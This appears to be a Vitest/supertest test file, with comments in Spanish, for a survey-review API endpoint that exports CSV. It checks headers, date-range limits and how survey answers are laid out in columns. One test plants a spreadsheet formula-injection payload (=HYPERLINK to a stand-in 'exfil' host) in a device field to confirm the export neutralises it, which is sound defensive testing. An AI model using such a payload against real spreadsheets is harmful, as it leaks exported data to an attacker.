// GET|HEAD /api/encuestas/export.csv: rango obligatorio, cabeceras, BOM y —lo
// específico de este módulo— el pivoteo del JSONB de P5 a las 7 columnas fijas
// del catálogo v1 y el aplanado de P6.
//
// Solo se sustituye el iterador: ENCUESTAS_CSV_HEADERS, toCsvRow y csvEscape son
// los reales, que es justo lo que se está comprobando que se emite. La BD no se
// toca.

import express, { NextFunction, Request, Response } from 'express';
import request from 'supertest';
import { describe, expect, it, vi } from 'vitest';

vi.mock('../../src/lib/prisma', () => ({ default: {} }));

const registrado = vi.hoisted(() => ({
  error: vi.fn(),
  warn: vi.fn(),
  info: vi.fn(),
  debug: vi.fn(),
}));
vi.mock('../../src/lib/logger', () => ({ logger: registrado }));

const iterateForExport = vi.hoisted(() => vi.fn());
vi.mock('../../src/services/encuestasRevisionService', async (importOriginal) => {
  const real = await importOriginal<typeof import('../../src/services/encuestasRevisionService')>();
  return { ...real, iterateForExport };
});

import encuestasRouter from '../../src/routes/encuestasRevisionRouter';
import { errorHandler } from '../../src/middlewares/errorHandler';
import { Roles } from '../../src/middlewares/roleMiddleware';
import {
  ENCUESTAS_CSV_HEADERS,
  type EncuestaExportRow,
} from '../../src/services/encuestasRevisionService';

function crearApp() {
  const app = express();
  // El authMiddleware (JWT) vive en el montaje de index.ts; aquí basta la
  // identidad que el requireRole del router espera encontrar.
  app.use((req: Request, _res: Response, next: NextFunction) => {
    req.user = { userId: 1, email: 'revisor@flotillas.invalid', role: Roles.REVISOR_QA };
    next();
  });
  app.use('/api/encuestas', encuestasRouter);
  app.use(errorHandler);
  return app;
}

const RUTA = '/api/encuestas/export.csv';
const FILTRO = { dateFrom: '2026-07-01', dateTo: '2026-07-31' };
const ENCABEZADOS = ENCUESTAS_CSV_HEADERS.join(',');

type Encabezado = (typeof ENCUESTAS_CSV_HEADERS)[number];

/**
 * Celda de una fila por nombre de columna. Vale un split ingenuo por comas
 * porque ninguna fixture mete comas dentro de una celda; la fila que sí las
 * lleva (la del =HYPERLINK) se comprueba por texto completo.
 */
function celda(linea: string, encabezado: Encabezado): string {
  return linea.split(',')[ENCUESTAS_CSV_HEADERS.indexOf(encabezado)];
}

function encuestaCompletada(overrides: Partial<EncuestaExportRow> = {}): EncuestaExportRow {
  return {
    id: 1,
    idRemoto: '7a1d9c22-1f4e-4f2a-9d3b-5c6e7f8a9b01',
    idLocal: '3f2504e0-4f89-41d3-9a0c-0305e82c3301',
    folioLocal: 'LX-1042',
    recibidoEn: new Date('2026-07-30T10:07:05.000Z'),
    fechaHoraInicio: new Date('2026-07-30T10:00:00.000Z'),
    fechaHoraFinalizacion: new Date('2026-07-30T10:06:40.000Z'),
    duracionSegundos: 400,
    estado: 'completada',
    elegibilidad: 'elegible',
    versionCuestionario: 1,
    credencialVigente: 'si',
    rangoEdad: '30_44',
    genero: 'mujer',
    partidoPreferido: 'morena',
    // Desordenadas a propósito: el CSV las coloca por catálogo, no por el orden
    // en que las mandó el teléfono.
    conocimientoPorPersona: [
      { persona: 'ernesto_montero', nivel: 'no_conoce' },
      { persona: 'lalo_ximenez', nivel: 'bien' },
      { persona: 'laura_estrada', nivel: 'algo' },
      { persona: 'paco_nino', nivel: 'poco' },
      { persona: 'gabriela_delgado', nivel: 'no_conoce' },
      { persona: 'irineo_molina', nivel: 'bien' },
      { persona: 'goyo_castaneda', nivel: 'poco' },
    ],
    mediosConocimiento: { tipo: 'respondida', medios: ['labor_social', 'redes_sociales'] },
    mayorPersonalidad: 'lalo_ximenez',
    candidatoPreferido: 'irineo_molina',
    ubicacionDisponible: true,
    ubicacionLat: 19.432608,
    ubicacionLng: -99.133209,
    ubicacionPrecisionM: 8.5,
    ubicacionEsValida: true,
    ubicacionCapturadaAt: new Date('2026-07-30T10:06:30.000Z'),
    ubicacionPermiso: 'concedido',
    ubicacionServicioActivo: true,
    ubicacionMotivoNoDisponible: null,
    dispositivoPlataforma: 'android',
    dispositivoModelo: 'Moto G54',
    dispositivoVersionSistema: '14',
    versionAplicacion: '1.0.3',
    dispositivo: { id: 3, identificador: 'encuestador-01' },
    ...overrides,
  };
}

/** Credencial no vigente: P2–P8 no se almacenan, así que llegan en NULL. */
function encuestaNoElegible(overrides: Partial<EncuestaExportRow> = {}): EncuestaExportRow {
  return encuestaCompletada({
    id: 2,
    idRemoto: '7a1d9c22-1f4e-4f2a-9d3b-5c6e7f8a9b02',
    idLocal: '3f2504e0-4f89-41d3-9a0c-0305e82c3302',
    folioLocal: null,
    estado: 'noElegible',
    elegibilidad: 'noElegible',
    credencialVigente: 'no',
    rangoEdad: null,
    genero: null,
    partidoPreferido: null,
    conocimientoPorPersona: null,
    mediosConocimiento: null,
    mayorPersonalidad: null,
    candidatoPreferido: null,
    ubicacionDisponible: false,
    ubicacionLat: null,
    ubicacionLng: null,
    ubicacionPrecisionM: null,
    ubicacionEsValida: null,
    ubicacionCapturadaAt: null,
    ubicacionPermiso: 'denegado',
    ubicacionServicioActivo: true,
    ubicacionMotivoNoDisponible: 'permisoDenegado',
    ...overrides,
  });
}

describe('HEAD /api/encuestas/export.csv', () => {
  it('sin rango de fechas responde 400 y no consulta nada', async () => {
    const response = await request(crearApp()).head(RUTA);

    expect(response.status).toBe(400);
    expect(iterateForExport).not.toHaveBeenCalled();
  });

  it('con rango válido emite cabeceras sin tocar la BD ni devolver cuerpo', async () => {
    const response = await request(crearApp()).head(RUTA).query(FILTRO);

    expect(response.status).toBe(200);
    expect(response.headers['content-type']).toContain('text/csv');
    expect(response.headers['content-disposition']).toContain(
      'encuestas-todas-2026-07-01_2026-07-31.csv',
    );
    expect(response.headers['cache-control']).toBe('private, no-store');
    expect(response.text ?? '').toBe('');
    expect(iterateForExport).not.toHaveBeenCalled();
  });

  it('el estado filtrado va en el nombre del archivo', async () => {
    const response = await request(crearApp())
      .head(RUTA)
      .query({ ...FILTRO, estado: 'noElegible' });

    expect(response.headers['content-disposition']).toContain(
      'encuestas-noElegible-2026-07-01_2026-07-31.csv',
    );
  });
});

describe('GET /api/encuestas/export.csv', () => {
  it('sin filas entrega BOM + la fila de encabezados con 200', async () => {
    // eslint-disable-next-line require-yield
    iterateForExport.mockImplementation(async function* () {});

    const response = await request(crearApp()).get(RUTA).query(FILTRO);

    expect(response.status).toBe(200);
    expect(response.headers['content-type']).toContain('text/csv');
    // El archivo es exactamente BOM + encabezados: ni una columna de más.
    expect(response.text).toBe(`\uFEFF${ENCABEZADOS}\r\n`);
    // Ni el body crudo ni su hash tienen columna en el CSV.
    expect(ENCUESTAS_CSV_HEADERS.some((h) => /payload|hash/i.test(h))).toBe(false);
  });

  it('reenvía los filtros del revisor al servicio', async () => {
    // eslint-disable-next-line require-yield
    iterateForExport.mockImplementation(async function* () {});

    await request(crearApp())
      .get(RUTA)
      .query({ ...FILTRO, estado: 'completada', dispositivo: 'encuestador' });

    expect(iterateForExport.mock.calls[0][0]).toEqual({
      estado: 'completada',
      dispositivo: 'encuestador',
      dateFrom: '2026-07-01',
      dateTo: '2026-07-31',
    });
  });

  it('pivotea P5 y aplana P6, y deja vacías las columnas de la encuesta no elegible', async () => {
    iterateForExport.mockImplementation(async function* () {
      yield [encuestaCompletada(), encuestaNoElegible()];
    });

    const response = await request(crearApp()).get(RUTA).query(FILTRO);

    expect(response.status).toBe(200);
    expect(response.headers['content-disposition']).toContain(
      'encuestas-todas-2026-07-01_2026-07-31.csv',
    );

    const lineas = response.text.split('\r\n');
    expect(lineas[0]).toBe(`\uFEFF${ENCABEZADOS}`);
    // La fila tiene tantas celdas como encabezados; el número exacto lo manda
    // ENCUESTAS_CSV_HEADERS, no una constante repetida aquí.
    expect(lineas[1].split(',')).toHaveLength(ENCUESTAS_CSV_HEADERS.length);
    expect(lineas[2].split(',')).toHaveLength(ENCUESTAS_CSV_HEADERS.length);
    expect(lineas[3]).toBe('');

    // Cada nivel bajo la columna de SU persona, con el orden del catálogo v1.
    expect(celda(lineas[1], 'Conoce lalo_ximenez')).toBe('bien');
    expect(celda(lineas[1], 'Conoce laura_estrada')).toBe('algo');
    expect(celda(lineas[1], 'Conoce paco_nino')).toBe('poco');
    expect(celda(lineas[1], 'Conoce gabriela_delgado')).toBe('no_conoce');
    expect(celda(lineas[1], 'Conoce irineo_molina')).toBe('bien');
    expect(celda(lineas[1], 'Conoce goyo_castaneda')).toBe('poco');
    expect(celda(lineas[1], 'Conoce ernesto_montero')).toBe('no_conoce');

    // P6: el orden lo fija MEDIOS_V1, no el del teléfono (que los mandó al revés).
    expect(celda(lineas[1], 'Medios (tipo)')).toBe('respondida');
    expect(celda(lineas[1], 'Medios')).toBe('redes_sociales;labor_social');

    // Fechas en UTC y booleanos como si/no.
    expect(celda(lineas[1], 'Recibido (UTC)')).toBe('2026-07-30T10:07:05.000Z');
    expect(celda(lineas[1], 'Finalización (UTC)')).toBe('2026-07-30T10:06:40.000Z');
    expect(celda(lineas[1], 'Captura GPS (UTC)')).toBe('2026-07-30T10:06:30.000Z');
    expect(celda(lineas[1], 'Ubicación disponible')).toBe('si');
    expect(celda(lineas[1], 'Ubicación válida')).toBe('si');
    // Las coordenadas NO llevan apóstrofo: son números, no fórmulas.
    expect(celda(lineas[1], 'Longitud')).toBe('-99.133209');

    // La no elegible: sin P5/P6 y sin las respuestas P2–P8.
    for (const persona of [
      'Conoce lalo_ximenez',
      'Conoce laura_estrada',
      'Conoce paco_nino',
      'Conoce gabriela_delgado',
      'Conoce irineo_molina',
      'Conoce goyo_castaneda',
      'Conoce ernesto_montero',
    ] as const) {
      expect(celda(lineas[2], persona)).toBe('');
    }
    expect(celda(lineas[2], 'Medios (tipo)')).toBe('');
    expect(celda(lineas[2], 'Medios')).toBe('');
    expect(celda(lineas[2], 'Partido preferido')).toBe('');
    expect(celda(lineas[2], 'Candidato preferido')).toBe('');
    expect(celda(lineas[2], 'Credencial vigente')).toBe('no');
    expect(celda(lineas[2], 'Ubicación disponible')).toBe('no');
    // NULL no es "no": la lectura de GPS no existe, no es que fuera inválida.
    expect(celda(lineas[2], 'Ubicación válida')).toBe('');
    expect(celda(lineas[2], 'Captura GPS (UTC)')).toBe('');
    expect(celda(lineas[2], 'Servicio ubicación activo')).toBe('si');
    expect(celda(lineas[2], 'Motivo no disponible')).toBe('permisoDenegado');

    expect(registrado.error).not.toHaveBeenCalled();
  });

  // El modelo del teléfono es texto libre que llega con una API key válida: sin
  // neutralizar, Excel ejecuta la celda al abrir el archivo.
  it('neutraliza una fórmula inyectada en el modelo del dispositivo', async () => {
    iterateForExport.mockImplementation(async function* () {
      yield [encuestaCompletada({ dispositivoModelo: '=HYPERLINK("http://exfil/?"&A2,"ok")' })];
    });

    const response = await request(crearApp()).get(RUTA).query(FILTRO);

    expect(response.status).toBe(200);
    expect(response.text).toContain(`"'=HYPERLINK(""http://exfil/?""&A2,""ok"")"`);
    // La celda ya no empieza por '=': Excel la lee como texto.
    expect(response.text).not.toContain(',=HYPERLINK');
  });

  it('rechaza con 400 un rango mayor a 366 días', async () => {
    const response = await request(crearApp())
      .get(RUTA)
      .query({ dateFrom: '2025-01-01', dateTo: '2026-07-31' });

    expect(response.status).toBe(400);
    expect(response.body.details).toContainEqual({
      field: 'dateTo',
      message: 'El rango máximo de exportación es 366 días',
    });
    expect(iterateForExport).not.toHaveBeenCalled();
  });

  it('acepta el rango límite de 366 días', async () => {
    // eslint-disable-next-line require-yield
    iterateForExport.mockImplementation(async function* () {});

    // 2026-01-01 … 2027-01-01 inclusive = 366 días.
    const response = await request(crearApp())
      .get(RUTA)
      .query({ dateFrom: '2026-01-01', dateTo: '2027-01-01' });

    expect(response.status).toBe(200);
  });
});
